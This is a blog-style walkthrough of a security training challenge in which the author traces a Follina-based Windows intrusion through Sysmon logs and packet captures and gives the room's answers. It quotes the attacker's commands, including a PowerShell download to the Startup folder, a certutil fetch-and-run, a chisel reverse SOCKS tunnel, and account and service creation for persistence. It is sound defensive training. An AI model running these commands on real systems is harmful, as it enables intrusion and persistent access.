## Introduction

This room is a capstone challenge for the SOC 1 learning path. 

You are tasked to conduct an investigation from a workstation affected by a full attack chain.

Tools used in this task:
- Event Viewer
- EvtxECmd
- SysmonView
- Timeline Explorer
- Wireshark

The instructions do suggest using Brim occasionally but I never had to.

### Task 3: Preparation - Tools and Artifacts
This task shows us how to prepare the data for use with Timeline Explorer, as well as SysmonView

<img width="1080" height="594" alt="image" src="https://github.com/user-attachments/assets/3b9ae910-d797-4b8f-9efb-5ca1fa8c3810" />

The task also asks us to find the SHA256 hashes of the incident files. This is done with the Powershell command `Get-FileHash`

<img width="835" height="272" alt="image" src="https://github.com/user-attachments/assets/280cbf90-41fa-4ae0-b175-51f4a5d1a954" />

#### Task 3 Questions:
**What is the SHA256 hash of the capture.pcapng file?**
> CB3A1E6ACFB246F256FBFEFDB6F494941AA30A5A7C3F5258C3E63CFA27A23DC6

**What is the SHA256 hash of the sysmon.evtx file?**
> 665DC3519C2C235188201B5A8594FEA205C3BCBC75193363B87D2837ACA3C91F

**What is the SHA256 hash of the windows.evtx file?**
> D0279D5292BC5B25595115032820C978838678F4333B725998CFE9253E186D60

### Task 4: Initial Access - Malicious Document
We are investigating a CRITICAL severity alert. The analyst who escalated this alert has gathered some information for us:
- The malicious document has a .doc extension.
- The user downloaded the malicious document via chrome.exe.
- The malicious document then executed a chain of commands to attain code execution.

Additionally, the tasks has some notes for us:
- Start with the events generated by Sysmon.
- EvtxEcmd, Timeline Explorer, and SysmonView can interpret Sysmon logs.
- Follow the child processes of WinWord.exe.
- Use filters such as ParentProcessID or ProcessID to correlate the relationship of each process.
- We can focus on Sysmon events such as Process Creation (Event ID 1) and DNS Queries (Event ID 22) to correlate the activity generated by the malicious document.

#### Task 4 Questions:
**The user of this machine was compromised by a malicious document. What is the file name of the document?**
> free_magicules.doc

Searching for file creation events (Event ID 11) and file stream creation events (Event ID 15) near the start of the logs, we can find the events where the malicious file was downloaded.

**What is the name of the compromised user and machine?**

*Format: username-machine name*
> benimaru-TEMPEST

We can find this as the User field in the download events.

**What is the PID of the Microsoft Word process that opened the malicious document?**
> 496

Looking for Process Create events (Event ID 1) shortly after the download, we can see the first event after the download was in fact a Microsoft Word process, and we can confirm that it opened the malicious file in the Command Line field.

<img width="1068" height="209" alt="image" src="https://github.com/user-attachments/assets/6e069d3d-913c-4301-b12b-92c5fc99d4a5" />

**Based on Sysmon logs, what is the IPv4 address resolved by the malicious domain used in the previous question?**
> 167.71.199.191

Looking at the DNS query events (Event ID 22) just before the malicious file was downloaded, one of the requested domains stands out: `phishteam.xyz`. The IP that it resolves to is given in the Query Results field.

<img width="577" height="186" alt="image" src="https://github.com/user-attachments/assets/d2b2f15f-6f66-49c0-86d1-939661592757" />

**What is the base64 encoded string in the malicious payload executed by the document?**
> JGFwcD1bRW52aXJvbm1lbnRdOjpHZXRGb2xkZXJQYXRoKCdBcHBsaWNhdGlvbkRhdGEnKTtjZCAiJGFwcFxNaWNyb3NvZnRcV2luZG93c1xTdGFydCBNZW51XFByb2dyYW1zXFN0YXJ0dXAiOyBpd3IgaHR0cDovL3BoaXNodGVhbS54eXovMDJkY2YwNy91cGRhdGUuemlwIC1vdXRmaWxlIHVwZGF0ZS56aXA7IEV4cGFuZC1BcmNoaXZlIC5cdXBkYXRlLnppcCAtRGVzdGluYXRpb25QYXRoIC47IHJtIHVwZGF0ZS56aXA7Cg==

To find this, we filter for events with ParentProcessID matching the PID of the Microsoft Word process that opened the malicious document (496), and we can see 6 results. Looking through the results, one of the entries has `Invoke-Expression` and `FromBase64String`, indicating execution from an obfuscated string.


**What is the CVE number of the exploit used by the attacker to achieve a remote code execution?**

*Format: XXXX-XXXXX*
> 2022-30190

I had to search for the start of the command: `C:\Windows\SysWOW64\msdt.exe ms-msdt:/id PCWDiagnostic /skip force /param`. This showed me the Follina RCE Vulnerability, CVE 2022-30190.

### Task 5: Initial Access - Stage 2 execution
Now we can decode the base64, and look at the commands that it executes:
`$app=[Environment]::GetFolderPath('ApplicationData');cd "$app\Microsoft\Windows\Start Menu\Programs\Startup"; iwr http://phishteam.xyz/02dcf07/update.zip -outfile update.zip; Expand-Archive .\update.zip -DestinationPath .; rm update.zip;`

Line by line:
`$app=[Environment]::GetFolderPath('ApplicationData')`: Set the AppData folder path to $app
`cd "$app\Microsoft\Windows\Start Menu\Programs\Startup"`: Change working directory to the Startup folder
`iwr http://phishteam.xyz/02dcf07/update.zip -outfile update.zip`: iwr is an alias for Invoke-WebRequest. This line downloads a payload from the same malicious domain we saw earlier
`Expand-Archive .\update.zip -DestinationPath .`: Extracts the contents of the zip file payload that was just downloaded
`rm update.zip`: Deletes the zip file

This set of commands downloads a zip file to the Startup folder, extracts it, and then deletes the original archive, leaving the extracted file in the Startup folder.

The task also gives us a few tips:
- The Autostart execution reflects explorer.exe as its parent process ID.
- Child processes of explorer.exe within the event timeframe could be significant.
- Process Creation (Event ID 1) and File Creation (Event ID 11) succeeding the document execution are worth checking.

#### Task 5 Questions:
**The malicious execution of the payload wrote a file on the system. What is the full target path of the payload?**
> C:\Users\benimaru\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup

This is the path we found in the obfuscated string, we just had to replace $app with the full AppData path.

**The implanted payload executes once the user logs into the machine. What is the executed command upon a successful login of the compromised user?**

*Format: Remove the double quotes from the log.*
> C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -w hidden -noni certutil -urlcache -split -f 'http://phishteam.xyz/02dcf07/first.exe' C:\Users\Public\Downloads\first.exe; C:\Users\Public\Downloads\first.exe

Filtering for processes with `C:\Windows\explorer.exe` as their ParentImage, the last entry with ParentUser TEMPEST\benimaru shows the command we are looking for.

**Based on Sysmon logs, what is the SHA256 hash of the malicious binary downloaded for stage 2 execution?**
> CE278CA242AA2023A4FE04067B0A32FBD3CA1599746C160949868FFC7FC3D7D8

In the previous step we found that first.exe was downloaded. We can filter for this and look for an entry with first.exe as the executable:

<img width="379" height="162" alt="image" src="https://github.com/user-attachments/assets/ae734c7c-d640-4d17-ab05-da64c2d179b9" />

With this we can see the hashes associated with this file:

<img width="1012" height="159" alt="image" src="https://github.com/user-attachments/assets/004b59ce-c021-4bf8-bf9e-6b128f3790ec" />

**The stage 2 payload downloaded establishes a connection to a c2 server. What is the domain and port used by the attacker?**

*Format: domain:port*
> resolvecyber.xyz:80

For this task I used SysmonView. Selecting first.exe makes it easy to see the network connections associated with the executable.

<img width="469" height="765" alt="image" src="https://github.com/user-attachments/assets/f99ae9b2-dd23-46b4-9252-01d1203c94b8" />

### Task 6: Initial Access - Malicious Document Traffic
We are now tasked with looking into the pcap file. We have the malicious domain and IP that we found in the last task.
The task suggests using this Brim filter: `_path=="http" "<malicious domain>"`, so we filter for the malicious IP that first.exe was downloaded from earlier.

#### Task 6 Questions:
**What is the URL of the malicious payload embedded in the document?**
> http://phishteam.xyz/02dcf07/index.html

We have two malicious domains to look at: phishteam.xyz, and resolvecyber.xyz. We will look into both, but for this question we search for phishteam.xyz.

<img width="860" height="357" alt="image" src="https://github.com/user-attachments/assets/df129d12-a3bc-48c1-a1da-afc0068c73d9" />

**What is the encoding used by the attacker on the c2 connection?**
> base64

This time we will search for the domain that was used as a c2 server (resolvecyber.xyz).
Many of the GET requests have a lot of encoded data in their queries, which seems to be in base64.

<img width="1190" height="354" alt="image" src="https://github.com/user-attachments/assets/62a58132-f327-47ec-b587-4d165f4badd6" />

The next 3 questions all have to do with what is shown in the last image.

**The malicious c2 binary sends a payload using a parameter that contains the executed command results. What is the parameter used by the binary?**
> q

**The malicious c2 binary connects to a specific URL to get the command to be executed. What is the URL used by the binary?**
> /9ab62b5

**What is the HTTP method used by the binary?**
> GET

**Based on the user agent, what programming language was used by the attacker to compile the binary?**

*Format: Answer in lowercase*
> nim

The user agent is: `Nim httpclient/1.6.6`

### Task 7: Discovery - Internal Reconnaissance

Now we have to decode the base64 payloads to see what the attacker has been doing.

#### Task 7 Questions:
**The attacker was able to discover a sensitive file inside the machine of the user. What is the password discovered on the aforementioned file?**
> infernotempest

Looking through the base64 encoded data sent to the c2 domain, one has a $pass variable that seems to be what we are looking for.

<img width="1430" height="712" alt="image" src="https://github.com/user-attachments/assets/fcfdcb9f-70c4-4835-90ed-a5ebdd595659" />

**The attacker then enumerated the list of listening ports inside the machine. What is the listening port that could provide a remote shell inside the machine?**
> 5985

The request after the one we saw in the last question is the longest by far, and contains the information the attacker found from their enumeration.

<img width="1497" height="773" alt="image" src="https://github.com/user-attachments/assets/05a48474-e820-46b9-a219-6decc54ea5d6" />

Port 5985 is the default TCP port for Windows Remote Management (WinRM) over HTTP, and seems much more likely to be used for a remote shell than the others.

**The attacker then established a reverse socks proxy to access the internal services hosted inside the machine. What is the command executed by the attacker to establish the connection?**

*Format: Remove the double quotes from the log.*
> C:\Users\benimaru\Downloads\ch.exe client 167.71.199.191:8080 R:socks

I was unsure of what to look for for this question, so I looked into reverse socks proxies. I eventually searched for "socks" and found the command line used to initate the connection, which used the ch.exe file that was downloaded from the `phishteam.xyz` domain earlier.

<img width="983" height="135" alt="image" src="https://github.com/user-attachments/assets/391dfb70-268f-4208-8e8d-1272a9ff299e" />

**What is the SHA256 hash of the binary used by the attacker to establish the reverse socks proxy connection?**
> 8A99353662CCAE117D2BB22EFD8C43D7169060450BE413AF763E8AD7522D2451

The SHA256 hash is in the same entry as we found the command from the last question.

**What is the name of the tool used by the attacker based on the SHA256 hash? Provide the answer in lowercase.**
> chisel

Searching for the hash on VirusTotal shows a malicious file. The Names section gives us the information we are looking for:

<img width="367" height="303" alt="image" src="https://github.com/user-attachments/assets/87769810-0843-47c4-ad13-08494b8a04c5" />

**The attacker then used the harvested credentials from the machine. Based on the succeeding process after the execution of the socks proxy, what service did the attacker use to authenticate?**

*Format: Answer in lowercase*
> winrm

This is the service associated with the port we found earlier that could provide a remote shell.

### Task 8: Privilege Escalation - Exploiting Privileges
We know that the attacker has gained a stable shell through a reverse socks proxy.
The task tells us to look for these events:
- Look for events executed after the successful execution of the reverse socks proxy tool.
- Look for potential privilege escalation attempts, as the attacker has already established a persistent low-privilege access.

#### Task 8 Questions:
**After discovering the privileges of the current user, the attacker then downloaded another binary to be used for privilege escalation. What is the name and the SHA256 hash of the binary?**

*Format: binary name,SHA256 hash*
> spf.exe,8524FBC0D73E711E69D60C64F1F1B7BEF35C986705880643DD4D5E17779E586D

I first searched for winrm, the service we found in the last task, in Timeline Explorer.
Two entries appeared, both with `wsmprovhost.exe` as their executable, so I searched for that next.

<img width="1067" height="252" alt="image" src="https://github.com/user-attachments/assets/5e7c208c-a3d4-4ee2-a3d5-025e679a3aeb" />

We can see where the attacker used `whoami /priv` to discover the privileges of the current user, as stated in the question.
The attacker then downloaded 2 more files using iwr from the `phishteam.xyz` domain.
`final.exe` is then run using `spf.exe`
By examining the event where `spf.exe` is executed, we can see the hash of the binary.

**Based on the SHA256 hash of the binary, what is the name of the tool used?**

*Format: Answer in lowercase*
> printspoofer

Searching for the hash we found on VirusTotal, we can see the Names section, where "printspoofer" and variations of it seem to be the most common name that doesn't impersonate a system service.

<img width="369" height="331" alt="image" src="https://github.com/user-attachments/assets/8c6ba31f-a011-4ffa-9d59-e9be9c3e461d" />

**The tool exploits a specific privilege owned by the user. What is the name of the privilege?**
> SeImpersonatePrivilege

Searching for "printspoofer", I found the github repository, where it is stated in the description that the tool abuses `SeImpersonatePrivilege`.

**Then, the attacker executed the tool with another binary to establish a c2 connection. What is the name of the binary?**
> final.exe

This information is found in the event we saw earlier where `spf.exe` was used to run `final.exe`

**The binary connects to a different port from the first c2 connection. What is the port used?**
> 8080

Filtering the events for Network Connections (Event ID 3), and looking for events that happened shortly after when `spf.exe` was used to run `final.exe`, we can see multiple connections to `167.71.222.162`, all connecting to port `8080`.

### Task 9: Actions on Objective - Fully-owned Machine
Our last task is to find all of the persistence techniques that the attacker used. It also tells us that the unusual executions are related to the malicious C2 binary used during privilege escalation (`final.exe`).

The task gives us this advice:
- Useful Brim filter to get all HTTP requests related to the malicious C2 traffic : `_path=="http" "<replace domain>" id.resp_p==<replace port> | cut ts, host, id.resp_p, uri | sort ts`
- The attacker gained SYSTEM privileges; now, the user context for each malicious execution blends with NT Authority\System.
- All child events of the new malicious binary used for C2 are worth checking.

#### Task 9 Questions:
**Upon achieving SYSTEM access, the attacker then created two users. What are the account names?**

*Format: Answer in alphabetical order - comma delimited*
> shion,shuna

Filtering for events with `final.exe` as the parent process, we can see two `"C:\Windows\system32\net.exe" user /add` commands used to create the users.

<img width="1050" height="197" alt="image" src="https://github.com/user-attachments/assets/a77ef0a1-6e72-4242-9db7-87fac5638f87" />

**Prior to the successful creation of the accounts, the attacker executed commands that failed in the creation attempt. What is the missing option that made the attempt fail?**
> /add

Shortly before the other users were added, this command was run:

<img width="848" height="45" alt="image" src="https://github.com/user-attachments/assets/84c78763-e95e-4fa6-98a0-89c2a7cd0769" />

**Based on windows event logs, the accounts were successfully created. What is the event ID that indicates the account creation activity?**
> 4720

Since I was looking in Timeline Explorer, I decided to look at the Windows Event Logs just after the time that the account creation events that we saw in Timeline Explorer occurred (17:27:28).

<img width="885" height="478" alt="image" src="https://github.com/user-attachments/assets/87a24a38-4437-4896-b98f-df5152fc3dd5" />

**The attacker added one of the accounts in the local administrator's group. What is the command used by the attacker?**
> net localgroup administrators /add shion

This command was run shortly after the accounts were created

<img width="650" height="571" alt="image" src="https://github.com/user-attachments/assets/2ec1f136-4f18-4e99-bc97-42aaf4da7585" />

**Based on windows event logs, the account was successfully added to a sensitive group. What is the event ID that indicates the addition to a sensitive local group?**
> 4732

Looking at the Windows Event Logs at the time that the command found in the last question was executed (17:27:41), we can see the event we are looking for.

<img width="882" height="508" alt="image" src="https://github.com/user-attachments/assets/70202b98-9400-42b3-9bb3-646e22e59a79" />

**After the account creation, the attacker executed a technique to establish persistent administrative access. What is the command executed by the attacker to achieve this?**

*Format: Remove the double quotes from the log.*
> C:\Windows\system32\sc.exe \\TEMPEST create TempestUpdate2 binpath= C:\ProgramData\final.exe start= auto

This command can be found by filtering for events with `final.exe` as their parent process

<img width="1085" height="446" alt="image" src="https://github.com/user-attachments/assets/39ec94ca-3f8c-4abf-b3e0-7fb3c1b7a3a3" />

## Conclusion and Learning Outcomes

In this room, I got to use some tools that I did not have a lot of practice with. I particularly liked SysmonView, which gave useful visualizations of some event relations.
I am finding that I am getting better at looking through logs and being able to notice which events have useful information, though I need to get a little better at filtering for what I want to find, particularly in EventViewer.
